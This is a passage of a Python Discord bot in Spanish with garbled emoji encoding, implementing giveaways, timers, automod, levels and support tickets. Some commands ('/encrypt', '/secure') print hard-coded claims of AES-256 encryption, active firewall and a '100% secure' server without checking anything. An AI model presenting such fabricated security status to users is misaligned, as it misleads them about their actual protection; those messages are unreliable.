      f"üìà Monitoreo en tiempo real ‚Üí CPU: {cpu}% | RAM: {ram}% | Seguridad: ALTA",
      f"üîé Diagn√≥stico ‚Üí CPU: {cpu}% | RAM: {ram}% | Estado de red: SEGURA",
      f"üõ†Ô∏è Estado actual ‚Üí CPU: {cpu}% | RAM: {ram}% | Conexiones: ESTABLES | Sin amenazas detectadas",
      f"üß† Inteligencia activa ‚Üí CPU: {cpu}% | RAM: {ram}% | Firewall y antivirus funcionando correctamente"
  ]

  await interaction.response.send_message(random.choice(respuestas))


@bot.tree.command(name='encrypt',
                description='Verifica el estado de la encriptaci√≥n')
async def encrypt_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  await interaction.response.send_message(
      "üîê Encriptaci√≥n AES-256 activada. Datos protegidos al 100%")


@bot.tree.command(name='secure', description='Genera un informe completo de seguridad')
async def secure_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  await interaction.response.send_message(
      "üîí INFORME DE SEGURIDAD:\n‚úÖ Firewall: ACTIVO\n‚úÖ Antivirus: ACTUALIZADO\n‚úÖ Backups: AL D√çA\n‚úÖ Encriptaci√≥n: HABILITADA\n\n"
      "**Servidor 100% SEGURO**"
  )


# Sistema de sorteos
active_giveaways = {}


class GiveawayView(discord.ui.View):

  def __init__(self, giveaway_id, winners_count, duration=None, requirement=None):
      super().__init__(timeout=None)
      self.giveaway_id = giveaway_id
      self.winners_count = winners_count
      self.duration = duration
      self.requirement = requirement
      self.participants = set()

  @discord.ui.button(label='üéâ Participar',
                     style=discord.ButtonStyle.green,
                     custom_id='participate_giveaway')
  async def participate(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
      user_id = interaction.user.id

      if user_id in self.participants:
          await interaction.response.send_message(
              "‚ùå Ya est√°s participando en este sorteo.", ephemeral=True)
          return

      self.participants.add(user_id)

      # Actualizar el embed con el contador
      embed = interaction.message.embeds[0]
      # Buscar el √≠ndice del campo de participantes
      field_index = -1
      for i, field in enumerate(embed.fields):
          if field.name == "üë• Participantes":
              field_index = i
              break

      if field_index != -1:
          embed.set_field_at(
              field_index,
              name="üë• Participantes",
              value=f"**{len(self.participants)}** usuarios participando",
              inline=True)

      await interaction.response.edit_message(embed=embed, view=self)

      # Mensaje privado de confirmaci√≥n
      try:
          await interaction.followup.send(
              "‚úÖ ¬°Te has unido al sorteo exitosamente!", ephemeral=True)
      except:
          pass

  @discord.ui.button(label='‚ùå Dejar de Participar',
                     style=discord.ButtonStyle.gray,
                     custom_id='leave_giveaway')
  async def leave_giveaway(self, interaction: discord.Interaction,
                         button: discord.ui.Button):
      user_id = interaction.user.id

      if user_id not in self.participants:
          await interaction.response.send_message(
              "‚ùå No est√°s participando en este sorteo.", ephemeral=True)
          return

      self.participants.remove(user_id)

      # Actualizar el embed con el contador
      embed = interaction.message.embeds[0]
      # Buscar el √≠ndice del campo de participantes
      field_index = -1
      for i, field in enumerate(embed.fields):
          if field.name == "üë• Participantes":
              field_index = i
              break

      if field_index != -1:
          embed.set_field_at(
              field_index,
              name="üë• Participantes",
              value=f"**{len(self.participants)}** usuarios participando",
              inline=True)

      await interaction.response.edit_message(embed=embed, view=self)

      # Mensaje privado de confirmaci√≥n
      try:
          await interaction.followup.send(
              "‚úÖ Has dejado de participar en el sorteo.", ephemeral=True)
      except:
          pass

  @discord.ui.button(label='üèÜ Finalizar Sorteo',
                     style=discord.ButtonStyle.red,
                     custom_id='end_giveaway')
  async def end_giveaway(self, interaction: discord.Interaction,
                       button: discord.ui.Button):
      # Solo el autor original puede finalizar
      if interaction.user.id != active_giveaways.get(self.giveaway_id,
                                                   {}).get('author_id'):
          await interaction.response.send_message(
              "‚ùå Solo quien cre√≥ el sorteo puede finalizarlo.",
              ephemeral=True)
          return

      if len(self.participants) == 0:
          await interaction.response.send_message(
              "‚ùå No hay participantes en el sorteo.", ephemeral=True)
          return

      # Seleccionar ganadores
      participants_list = list(self.participants)
      winners_count = min(self.winners_count, len(participants_list))
      winners = random.sample(participants_list, winners_count)

      # Crear embed de resultados
      embed = discord.Embed(title="üéä ¬°SORTEO FINALIZADO!",
                            color=discord.Color.gold())

      giveaway_data = active_giveaways.get(self.giveaway_id, {})
      embed.add_field(name="üéÅ Premio",
                      value=giveaway_data.get('prize', 'No especificado'),
                      inline=False)

      winners_text = ""
      for i, winner_id in enumerate(winners):
          try:
              winner = bot.get_user(winner_id)
              if winner:
                  winners_text += f"{'ü•á' if i == 0 else 'üéâ'} {winner.mention}\n"
              else:
                  winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"
          except:
              winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"

      embed.add_field(name="üèÜ Ganadores", value=winners_text, inline=False)
      embed.add_field(
          name="üìä Estad√≠sticas",
          value=f"**{len(self.participants)}** participantes totales",
          inline=False)
      embed.set_footer(
          text=f"Sorteo finalizado por {interaction.user.display_name}")

      # Deshabilitar botones
      for item in self.children:
          item.disabled = True

      await interaction.response.edit_message(embed=embed, view=self)

      # Eliminar del registro
      if self.giveaway_id in active_giveaways:
          del active_giveaways[self.giveaway_id]


@bot.tree.command(name="gstart", description="Iniciar un sorteo interactivo")
@discord.app_commands.describe(
  duration="Duraci√≥n en minutos (opcional, por defecto sin l√≠mite)",
  winners="N√∫mero de ganadores",
  prize="Premio del sorteo",
  requirement="Requisito para participar (opcional)")
async def gstart(interaction: discord.Interaction,
                 winners: int,
                 prize: str,
                 duration: int = 0,
                 requirement: str = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if winners <= 0:
      await interaction.response.send_message(
          "‚ùå El n√∫mero de ganadores debe ser mayor a 0.", ephemeral=True)
      return

  if winners > 20:
      await interaction.response.send_message(
          "‚ùå El n√∫mero m√°ximo de ganadores es 20.", ephemeral=True)
      return

  # Generar ID √∫nico para el sorteo
  giveaway_id = f"{interaction.guild.id}_{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

  # Guardar datos del sorteo
  active_giveaways[giveaway_id] = {
      'author_id': interaction.user.id,
      'prize': prize,
      'winners_count': winners,
      'channel_id': interaction.channel.id,
      'requirement': requirement
  }

  # Crear embed del sorteo
  embed = discord.Embed(
      title="üéâ ¬°NUEVO SORTEO!",
      description=f"¬°Participa haciendo clic en el bot√≥n de abajo!",
      color=discord.Color.blue())

  embed.add_field(name="üéÅ Premio", value=prize, inline=True)
  embed.add_field(name="üèÜ Ganadores",
                  value=f"{winners} ganador{'es' if winners > 1 else ''}",
                  inline=True)
  embed.add_field(name="üë• Participantes",
                  value="**0** usuarios participando",
                  inline=True)

  # A√±adir requisito si existe
  if requirement:
      embed.add_field(name="üìã Requisito",
                      value=requirement,
                      inline=False)

  if duration > 0:
      end_time = datetime.datetime.utcnow() + datetime.timedelta(
          minutes=duration)
      embed.add_field(name="‚è∞ Finaliza",
                      value=f"<t:{int(end_time.timestamp())}:R>",
                      inline=False)
  else:
      embed.add_field(name="‚è∞ Duraci√≥n",
                      value="Sin l√≠mite de tiempo (finalizar manualmente)",
                      inline=False)

  embed.set_footer(text=f"Sorteo creado por {interaction.user.display_name}",
                 icon_url=interaction.user.display_avatar.url)

  # Crear vista con botones
  view = GiveawayView(giveaway_id, winners, duration, requirement)

  await interaction.response.send_message(embed=embed, view=view)

  # Si tiene duraci√≥n, programar finalizaci√≥n autom√°tica
  if duration > 0:
      await asyncio.sleep(duration * 60)

      # Verificar si el sorteo sigue activo
      if giveaway_id in active_giveaways:
          try:
              message = await interaction.original_response()

              if len(view.participants) == 0:
                  embed = discord.Embed(
                      title="‚è∞ Sorteo Terminado",
                      description="El sorteo ha terminado sin participantes.",
                      color=discord.Color.orange())
                  embed.add_field(name="üéÅ Premio", value=prize, inline=False)

                  for item in view.children:
                      item.disabled = True

                  await message.edit(embed=embed, view=view)
              else:
                  # Finalizar autom√°ticamente
                  participants_list = list(view.participants)
                  winners_count = min(winners, len(participants_list))
                  auto_winners = random.sample(participants_list,
                                             winners_count)

                  embed = discord.Embed(
                      title="‚è∞ ¬°SORTEO TERMINADO AUTOM√ÅTICAMENTE!",
                      color=discord.Color.gold())

                  embed.add_field(name="üéÅ Premio", value=prize, inline=False)

                  # A√±adir requisito si exist√≠a
                  if requirement:
                      embed.add_field(name="üìã Requisito", value=requirement, inline=False)

                  winners_text = ""
                  for i, winner_id in enumerate(auto_winners):
                      try:
                          winner = bot.get_user(winner_id)
                          if winner:
                              winners_text += f"{'ü•á' if i == 0 else 'üéâ'} {winner.mention}\n"
                          else:
                              winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"
                      except:
                          winners_text += f"{'ü•á' if i == 0 else 'üéâ'} Usuario ID: {winner_id}\n"

                  embed.add_field(name="üèÜ Ganadores",
                                  value=winners_text,
                                  inline=False)
                  embed.add_field(
                      name="üìä Estad√≠sticas",
                      value=
                      f"**{len(view.participants)}** participantes totales",
                      inline=False)
                  embed.set_footer(
                      text="Sorteo finalizado autom√°ticamente por tiempo")

                  for item in view.children:
                      item.disabled = True

                  await message.edit(embed=embed, view=view)

              # Limpiar del registro
              if giveaway_id in active_giveaways:
                  del active_giveaways[giveaway_id]

          except Exception as e:
              print(f"Error al finalizar sorteo autom√°ticamente: {e}")


# Sistema de temporizadores
active_timers = {}


@bot.tree.command(name="timer", description="Establecer un temporizador")
@discord.app_commands.describe(duration="Duraci√≥n en minutos",
                       message="Mensaje personalizado (opcional)")
async def timer(interaction: discord.Interaction,
        duration: int,
        message: str = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  if duration <= 0:
      await interaction.response.send_message(
          "‚ùå La duraci√≥n debe ser mayor a 0 minutos.", ephemeral=True)
      return

  if duration > 1440:  # 24 horas m√°ximo
      await interaction.response.send_message(
          "‚ùå La duraci√≥n m√°xima es de 1440 minutos (24 horas).",
          ephemeral=True)
      return

  # Crear ID √∫nico para el temporizador
  timer_id = f"{interaction.user.id}_{int(datetime.datetime.utcnow().timestamp())}"

  # Calcular tiempo de finalizaci√≥n
  end_time = datetime.datetime.utcnow() + datetime.timedelta(
      minutes=duration)

  # Guardar temporizador activo
  active_timers[timer_id] = {
      'user_id': interaction.user.id,
      'channel_id': interaction.channel.id,
      'message': message or "¬°Tu temporizador ha terminado!",
      'end_time': end_time
  }

  # Crear embed del temporizador
  embed = discord.Embed(title="‚è∞ Temporizador Establecido",
                      color=discord.Color.blue())

  embed.add_field(name="‚è±Ô∏è Duraci√≥n",
                value=f"{duration} minutos",
                inline=True)
  embed.add_field(name="üïê Finaliza",
                value=f"<t:{int(end_time.timestamp())}:R>",
                inline=True)
  embed.add_field(name="üí¨ Mensaje",
                value=message or "¬°Tu temporizador ha terminado!",
                inline=False)
  embed.set_footer(text=f"Temporizador de {interaction.user.display_name}",
                 icon_url=interaction.user.display_avatar.url)

  await interaction.response.send_message(embed=embed)

  # Esperar el tiempo especificado
  await asyncio.sleep(duration * 60)

  # Verificar si el temporizador sigue activo
  if timer_id in active_timers:
      timer_data = active_timers[timer_id]

      try:
          # Crear embed de notificaci√≥n
          notification_embed = discord.Embed(
              title="üîî ¬°TEMPORIZADOR TERMINADO!",
              description=timer_data['message'],
              color=discord.Color.green())
          notification_embed.add_field(name="‚è±Ô∏è Duraci√≥n",
                                     value=f"{duration} minutos",
                                     inline=True)
          notification_embed.set_footer(text=f"Recordatorio de hace {duration} minutos")

          # Mencionar al usuario
          channel = bot.get_channel(timer_data['channel_id'])
          if channel:
              user = bot.get_user(timer_data['user_id'])
              user_mention = user.mention if user else f"<@{timer_data['user_id']}>"
              await channel.send(f"üîî {user_mention}",
                               embed=notification_embed)

          # Limpiar del registro
          del active_timers[timer_id]

      except Exception as e:
          print(f"Error al enviar notificaci√≥n de temporizador: {e}")
          # Limpiar del registro incluso si hay error
          if timer_id in active_timers:
              del active_timers[timer_id]


# ================================
# SISTEMA DE MODERACI√ìN AUTOM√ÅTICA
# ================================

# Sistema de automod mejorado
automod_enabled = {}
automod_settings = {}
warning_counts = {}
user_message_timestamps = {}  # Para detectar spam

@bot.tree.command(name='automod',
                description='Configurar sistema de moderaci√≥n autom√°tica')
@discord.app_commands.describe(
  enable="Activar o desactivar automod",
  spam_limit="L√≠mite de mensajes por minuto antes de tomar acci√≥n",
  warn_threshold="N√∫mero de advertencias antes de aplicar castigo")
async def automod_setup(interaction: discord.Interaction,
                enable: bool,
                spam_limit: int = 5,
                warn_threshold: int = 3):
  if not interaction.user.guild_permissions.manage_guild:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Servidor**.",
          ephemeral=True)
      return

  guild_id = interaction.guild.id
  automod_enabled[guild_id] = enable
  automod_settings[guild_id] = {
      'spam_limit': spam_limit,
      'warn_threshold': warn_threshold
  }

  embed = discord.Embed(
      title="üõ°Ô∏è Sistema de Moderaci√≥n Autom√°tica",
      description=f"**Estado:** {'‚úÖ Activado' if enable else '‚ùå Desactivado'}",
      color=discord.Color.green() if enable else discord.Color.red())

  if enable:
      embed.add_field(
          name="üìä Configuraci√≥n",
          value=f"‚Ä¢ L√≠mite de spam: {spam_limit} msg/min\n‚Ä¢ Advertencias m√°ximas: {warn_threshold}\n‚Ä¢ Castigo: Silencio por 2 d√≠as",
          inline=False)
      embed.add_field(
          name="üö´ Se detectar√°",
          value="‚Ä¢ Palabras prohibidas\n‚Ä¢ Spam de mensajes\n‚Ä¢ Links maliciosos\n‚Ä¢ Menciones masivas",
          inline=False)

  await interaction.response.send_message(embed=embed)


# Filtro de palabras prohibidas
banned_words = [
  # Palabras ofensivas b√°sicas
  "idiota",
  "estupido",
  "imbecil",
  "tonto",
  "burro",
  # Insultos m√°s fuertes (censurados)
  "m*****",
  "c*****",
  "p****",
  "h***"
  "z****"
]


# Sistema de niveles/experiencia
levels_file = 'levels.json'
if os.path.exists(levels_file):
  with open(levels_file, 'r') as f:
      user_levels = json.load(f)
else:
  user_levels = {}

def save_levels():
  with open(levels_file, 'w') as f:
      json.dump(user_levels, f)


def get_user_level_data(user_id):
  user_id = str(user_id)
  if user_id not in user_levels:
      user_levels[user_id] = {"xp": 0, "level": 1, "messages": 0}
  return user_levels[user_id]


def add_xp(user_id, xp_amount):
  user_id = str(user_id)
  data = get_user_level_data(user_id)
  data["xp"] += xp_amount
  data["messages"] += 1

  # Calcular nuevo nivel
  xp_needed = data["level"] * 100
  if data["xp"] >= xp_needed:
      data["level"] += 1
      data["xp"] = data["xp"] - xp_needed
      save_levels()
      return True  # Subi√≥ de nivel

  save_levels()
  return False  # No subi√≥ de nivel


# Funci√≥n auxiliar para sistema de niveles (sin decorador @bot.event)
async def process_level_system(message):
  if message.author.bot:
      return

  # Sistema de niveles (XP por mensaje)
  xp_gained = random.randint(5, 15)
  leveled_up = add_xp(message.author.id, xp_gained)

  if leveled_up:
      data = get_user_level_data(message.author.id)
      embed = discord.Embed(
          title="üéâ ¬°Subiste de Nivel!",
          description=
          f"{message.author.mention} alcanz√≥ el **Nivel {data['level']}**!",
          color=discord.Color.gold())
      await message.channel.send(embed=embed, delete_after=10)


@bot.tree.command(name='level', description='Ver tu nivel y experiencia')
@discord.app_commands.describe(user="Usuario del que ver el nivel (opcional)")
async def check_level(interaction: discord.Interaction, user: discord.Member = None):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  target = user or interaction.user
  data = get_user_level_data(target.id)

  xp_needed = data["level"] * 100
  progress = (data["xp"] / xp_needed) * 100

  embed = discord.Embed(title=f"üìä Nivel de {target.display_name}",
                      color=target.color if target.color
                      != discord.Color.default() else discord.Color.blue())
  embed.set_thumbnail(url=target.display_avatar.url)

  embed.add_field(name="üèÜ Nivel", value=data["level"], inline=True)
  embed.add_field(name="‚≠ê XP",
                value=f"{data['xp']}/{xp_needed}",
                inline=True)
  embed.add_field(name="üí¨ Mensajes", value=data["messages"], inline=True)
  embed.add_field(name="üìà Progreso", value=f"{progress:.1f}%", inline=False)

  # Barra de progreso visual
  filled = int(progress // 10)
  bar = "‚ñà" * filled + "‚ñë" * (10 - filled)
  embed.add_field(name="üìä Barra de Progreso", value=f"`{bar}`", inline=False)

  await interaction.response.send_message(embed=embed)


@bot.tree.command(name='leaderboard_levels',
                description='Ver ranking de niveles del servidor')
async def level_leaderboard(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  # Crear lista de usuarios con sus niveles
  user_list = []
  for user_id, data in user_levels.items():
      try:
          user = bot.get_user(int(user_id))
          if user and not user.bot:
              total_xp = (data["level"] - 1) * 100 + data["xp"]
              user_list.append((user.display_name, data["level"], total_xp,
                              data["messages"]))
      except:
          continue

  # Ordenar por nivel y luego por XP total
  user_list.sort(key=lambda x: (x[1], x[2]), reverse=True)
  user_list = user_list[:10]  # Top 10

  embed = discord.Embed(title="üèÜ Ranking de Niveles",
                      color=discord.Color.gold())

  if not user_list:
      embed.description = "No hay datos de niveles disponibles."
  else:
      description = ""
      medals = ["ü•á", "ü•à", "ü•â"]
      for i, (name, level, total_xp, messages) in enumerate(user_list):
          medal = medals[i] if i < 3 else f"{i+1}."
          description += f"{medal} **{name}** - Nivel {level} ({messages} mensajes)\n"
      embed.description = description

  await interaction.response.send_message(embed=embed)


# Sistema de categor√≠as de tickets
ticket_categories_file = 'ticket_categories.json'
if os.path.exists(ticket_categories_file):
  with open(ticket_categories_file, 'r') as f:
      ticket_categories = json.load(f)
else:
  ticket_categories = {}

def save_ticket_categories():
  with open(ticket_categories_file, 'w') as f:
      json.dump(ticket_categories, f, indent=4)

async def update_all_ticket_panels(guild):
  """Actualizar todos los paneles de tickets del servidor"""
  try:
      for channel in guild.text_channels:
          async for message in channel.history(limit=50):
              if (message.author == guild.me and
                  message.embeds and
                  "Sistema de Tickets" in message.embeds[0].title):

                  # Crear nueva vista con categor√≠as actualizadas
                  view = TicketView(guild.id)

                  # Actualizar embed con nueva informaci√≥n
                  embed = message.embeds[0]
                  categories = get_guild_categories(guild.id)
                  active_count = len([ch for ch in guild.channels if ch.name.startswith('ticket-')])

                  # Actualizar campos
                  for i, field in enumerate(embed.fields):
                      if "Categor√≠as Disponibles" in field.name:
                          categories_text = "\n".join([f"‚Ä¢ {cat['name']}" for cat in categories.values()][:8])
                          if len(categories) > 8:
                              categories_text += f"\n‚Ä¢ Y {len(categories) - 8} m√°s..."
                          embed.set_field_at(i, name="üìã Categor√≠as Disponibles", value=categories_text, inline=True)
                      elif "Tickets Activos" in field.name:
                          embed.set_field_at(i, name="üé´ Tickets Activos", value=f"**{active_count}** tickets abiertos", inline=True)

                  await message.edit(embed=embed, view=view)
                  print(f"Panel de tickets actualizado en canal: {channel.name}")

  except Exception as e:
      print(f"Error actualizando paneles de tickets: {e}")

def get_guild_categories(guild_id):
  guild_id = str(guild_id)
  if guild_id not in ticket_categories:
      ticket_categories[guild_id] = {
          "general": {"name": "üé´ Soporte General", "color": "blue", "description": "Ayuda general y consultas"},
          "bugs": {"name": "üêõ Reportar Bug", "color": "red", "description": "Reportar errores o problemas"},
          "suggestions": {"name": "üí° Sugerencias", "color": "green", "description": "Ideas y mejoras"},
          "other": {"name": "‚ùì Otros", "color": "gray", "description": "Otros asuntos"}
      }
      save_ticket_categories()
  return ticket_categories[guild_id]

# ================================
# Sistema de tickets de soporte
# ================================

active_tickets = {}


class TicketView(discord.ui.View):

  def __init__(self, guild_id):
      super().__init__(timeout=None)
      self.guild_id = guild_id
      self.setup_category_buttons()

  def setup_category_buttons(self):
      """Configurar botones din√°micos basados en las categor√≠as disponibles"""
      categories = get_guild_categories(self.guild_id)

      # Limpiar botones existentes
      self.clear_items()

      # A√±adir bot√≥n para cada categor√≠a (m√°ximo 5 por fila)
      for i, (category_id, category_data) in enumerate(categories.items()):
          if i >= 25:  # Discord limite de 25 botones por view
              break

          # Determinar color del bot√≥n
          style_map = {
              'red': discord.ButtonStyle.danger,
              'green': discord.ButtonStyle.success,
              'blue': discord.ButtonStyle.primary,
              'gray': discord.ButtonStyle.secondary,
              'grey': discord.ButtonStyle.secondary
          }

          button_style = style_map.get(category_data.get('color', 'blue'), discord.ButtonStyle.primary)

          # Crear bot√≥n personalizado
          button = discord.ui.Button(
              label=category_data['name'][:80],  # Discord l√≠mite de caracteres
              style=button_style,
              custom_id=f'ticket_{category_id}',
              emoji='üé´'
          )

          # Crear callback din√°mico
          async def button_callback(interaction, cat_id=category_id, cat_data=category_data):
              await self.create_ticket_with_category(interaction, cat_id, cat_data)

          button.callback = button_callback
          self.add_item(button)

  async def create_ticket_with_category(self, interaction: discord.Interaction, category_id: str, category_data: dict):
      guild = interaction.guild
      user = interaction.user

      # Verificar si ya tiene un ticket abierto
      existing_ticket = None
      for channel in guild.channels:
          if channel.name == f"ticket-{user.name.lower()}" or channel.name == f"ticket-{user.id}":
              existing_ticket = channel
              break

      if existing_ticket:
          await interaction.response.send_message(
              f"‚ùå Ya tienes un ticket abierto: {existing_ticket.mention}",
              ephemeral=True)
          return

      # Crear canal de ticket
      try:
          overwrites = {
              guild.default_role:
              discord.PermissionOverwrite(read_messages=False),
              user:
              discord.PermissionOverwrite(read_messages=True,
                                          send_messages=True),
              guild.me:
              discord.PermissionOverwrite(read_messages=True,
                                          send_messages=True)
          }

          # Buscar rol de moderador o admin
          mod_role = None
          for role in guild.roles:
              if any(name in role.name.lower()
                     for name in ['mod', 'admin', 'staff', 'soporte']):
                  mod_role = role
                  overwrites[role] = discord.PermissionOverwrite(
                      read_messages=True, send_messages=True)
                  break

          # Determinar color del embed basado en la categor√≠a
          color_map = {
              'red': discord.Color.red(),
              'green': discord.Color.green(),
              'blue': discord.Color.blue(),
              'gray': discord.Color.light_grey(),
              'grey': discord.Color.light_grey()
          }
          embed_color = color_map.get(category_data.get('color', 'blue'), discord.Color.blue())

          ticket_channel = await guild.create_text_channel(
              f"ticket-{category_id}-{user.name.lower().replace(' ', '-')}-{user.id}",
              overwrites=overwrites,
              category=None,
              reason=f"Ticket de {category_data['name']} creado por {user.name}")

          # Mensaje inicial del ticket
          embed = discord.Embed(
              title=f"{category_data['name']} - Ticket Creado",
              description=f"Hola {user.mention}! Tu ticket de **{category_data['name']}** ha sido creado.\n\n"
              f"üìù **Describe tu consulta** y el equipo de soporte te ayudar√° pronto.\n"
              f"üîí Para cerrar este ticket, usa el bot√≥n de abajo.",
              color=embed_color)
          embed.add_field(name="üìã Categor√≠a", value=category_data['name'], inline=True)
          embed.add_field(name="üÜî Ticket ID", value=f"{category_id}-{user.id}", inline=True)
          embed.set_footer(text=f"Ticket creado por {user.display_name}")

          close_view = CloseTicketView()
          await ticket_channel.send(embed=embed, view=close_view)

          # Mensaje de confirmaci√≥n
          await interaction.response.send_message(
              f"‚úÖ Tu ticket de **{category_data['name']}** ha sido creado: {ticket_channel.mention}",
              ephemeral=True)

          # Guardar ticket activo
          active_tickets[user.id] = ticket_channel.id

          # Actualizar contador en el panel principal
          await self.update_ticket_panel(interaction.guild)

      except Exception as e:
          await interaction.response.send_message(
              f"‚ùå Error al crear el ticket: {str(e)}", ephemeral=True)

  async def update_ticket_panel(self, guild):
      """Actualizar el panel de tickets con el contador actual y botones din√°micos"""
      try:
          # Buscar el mensaje del panel de tickets en el servidor
          for channel in guild.text_channels:
              async for message in channel.history(limit=50):
                  if (message.author == guild.me and
                      message.embeds and
                      "Sistema de Tickets" in message.embeds[0].title):

                      # Contar tickets activos
                      active_count = len([ch for ch in guild.channels
                                        if ch.name.startswith('ticket-')])

                      # Actualizar embed
                      embed = message.embeds[0]

                      # Buscar y actualizar el campo de estad√≠sticas
                      updated = False
                      for i, field in enumerate(embed.fields):
                          if "Tickets Activos" in field.name:
                              embed.set_field_at(i,
                                               name="üé´ Tickets Activos",
                                               value=f"**{active_count}** tickets abiertos",
                                               inline=True)
                              updated = True
                              break

                      # Si no existe el campo, agregarlo
                      if not updated:
                          embed.add_field(name="üé´ Tickets Activos",
                                         value=f"**{active_count}** tickets abiertos",
                                         inline=True)

                      # Obtener categor√≠as disponibles
                      categories = get_guild_categories(guild.id)
                      categories_text = "\n".join([f"‚Ä¢ {cat['name']}" for cat in categories.values()][:8])
                      if len(categories) > 8:
                          categories_text += f"\n‚Ä¢ Y {len(categories) - 8} m√°s..."

                      # Actualizar o agregar campo de categor√≠as
                      categories_updated = False
                      for i, field in enumerate(embed.fields):
                          if "Categor√≠as Disponibles" in field.name:
                              embed.set_field_at(i,
                                               name="üìã Categor√≠as Disponibles",
                                               value=categories_text,
                                               inline=True)
                              categories_updated = True
                              break

                      if not categories_updated:
                          embed.add_field(name="üìã Categor√≠as Disponibles",
                                         value=categories_text,
                                         inline=True)

                      # Crear nueva vista con botones actualizados
                      new_view = TicketView(guild.id)

                      await message.edit(embed=embed, view=new_view)
                      return
      except Exception as e:
          print(f"Error actualizando panel de tickets: {e}")


class CloseTicketView(discord.ui.View):

  def __init__(self):
      super().__init__(timeout=None)

  @discord.ui.button(label='üîí Cerrar Ticket',
                     style=discord.ButtonStyle.red,
                     custom_id='close_ticket')
  async def close_ticket(self, interaction: discord.Interaction,
                       button: discord.ui.Button):
      channel = interaction.channel

      # Confirmar cierre
      embed = discord.Embed(
          title="‚ö†Ô∏è Confirmar Cierre",
          description=
          "¬øEst√°s seguro de que quieres cerrar este ticket?\n\n**Esta acci√≥n no se puede deshacer.**",
          color=discord.Color.orange())

      confirm_view = ConfirmCloseView()
      await interaction.response.send_message(embed=embed,
                                              view=confirm_view,
                                              ephemeral=True)


class ConfirmCloseView(discord.ui.View):

  def __init__(self):
      super().__init__(timeout=60)

  @discord.ui.button(label='‚úÖ S√≠, cerrar',
                   style=discord.ButtonStyle.red,
                   custom_id='confirm_close')
  async def confirm_close(self, interaction: discord.Interaction,
                        button: discord.ui.Button):
      channel = interaction.channel

      try:
          # Remover de tickets activos
          user_id = None
          for uid, cid in active_tickets.items():
              if cid == channel.id:
                  user_id = uid
                  break

          if user_id:
              del active_tickets[user_id]

          await interaction.response.send_message(
              "üîí **Cerrando ticket...** Este canal se eliminar√° en 5 segundos.",
              ephemeral=False)

          guild = interaction.guild
          await asyncio.sleep(5)
          await channel.delete(reason="Ticket cerrado")

          # Actualizar panel de tickets despu√©s de cerrar
          try:
              ticket_view = TicketView(guild.id)
              await ticket_view.update_ticket_panel(guild)
          except Exception as e:
              print(f"Error actualizando panel tras cerrar ticket: {e}")

      except Exception as e:
          await interaction.response.send_message(
              f"‚ùå Error al cerrar el ticket: {str(e)}", ephemeral=True)

  @discord.ui.button(label='‚ùå Cancelar',
                   style=discord.ButtonStyle.gray,
                   custom_id='cancel_close')
  async def cancel_close(self, interaction: discord.Interaction,
                       button: discord.ui.Button):
      await interaction.response.send_message(
          "‚úÖ Cierre cancelado. El ticket permanece abierto.", ephemeral=True)


@bot.tree.command(
  name="ticket_setup",
  description="Configurar sistema de tickets en el canal actual")
async def setup_tickets(interaction: discord.Interaction):
  if not interaction.user.guild_permissions.manage_channels:
      await interaction.response.send_message(
          "‚ùå Necesitas permisos de **Administrar Canales**.", ephemeral=True)
      return

  # Contar tickets activos
  active_count = len([ch for ch in interaction.guild.channels
                     if ch.name.startswith('ticket-')])

  # Obtener categor√≠as disponibles
  categories = get_guild_categories(interaction.guild.id)
  categories_text = "\n".join([f"‚Ä¢ {cat['name']}" for cat in categories.values()][:5])
  if len(categories) > 5:
      categories_text += f"\n‚Ä¢ Y {len(categories) - 5} m√°s..."

  embed = discord.Embed(
      title="üé´ Sistema de Tickets de Soporte",
      description=
      "**¬øNecesitas ayuda?** Selecciona una categor√≠a abajo para crear tu ticket.\n\n"
      "üîπ **¬øPara qu√© usar los tickets?**\n"
      "‚Ä¢ Reportar problemas\n"
      "‚Ä¢ Solicitar ayuda\n"
      "‚Ä¢ Consultas privadas\n"
      "‚Ä¢ Sugerencias\n\n"
      "‚è±Ô∏è **Tiempo de respuesta promedio:** 1-24 horas",
      color=discord.Color.blue())

  embed.add_field(name="üé´ Tickets Activos",
                 value=f"**{active_count}** tickets abiertos",
                 inline=True)

  embed.add_field(name="üìã Categor√≠as Disponibles",
                 value=categories_text,
                 inline=True)

  embed.set_footer(text="Selecciona una categor√≠a para crear tu ticket ‚Ä¢ Panel actualizado autom√°ticamente")

  view = TicketView(interaction.guild.id)
  await interaction.response.send_message(embed=embed, view=view)


@bot.tree.command(name="ticket", description="Alias corto para configurar tickets")
async def ticket_short(interaction: discord.Interaction):
  await setup_tickets(interaction)


@bot.tree.command(name="tsetup", description="Alias muy corto para configurar tickets")
async def tsetup_short(interaction: discord.Interaction):
  await setup_tickets(interaction)


@bot.tree.command(name="close", description="Cerrar el ticket actual")
async def close_ticket_slash(interaction: discord.Interaction):
  if economy_only_mode or slash_commands_disabled:
      await interaction.response.send_message(
          "‚ùå Los comandos slash est√°n desactivados temporalmente.",
          ephemeral=True)
      return

  channel = interaction.channel

  # Verificar si estamos en un canal de ticket
  if not channel.name.startswith('ticket-'):
      await interaction.response.send_message(
          "‚ùå Este comando solo puede usarse en canales de tickets.",
          ephemeral=True)
      return

  # Verificar permisos (solo el creador del ticket o moderadores)
  is_moderator = (interaction.user.guild_permissions.manage_channels or 
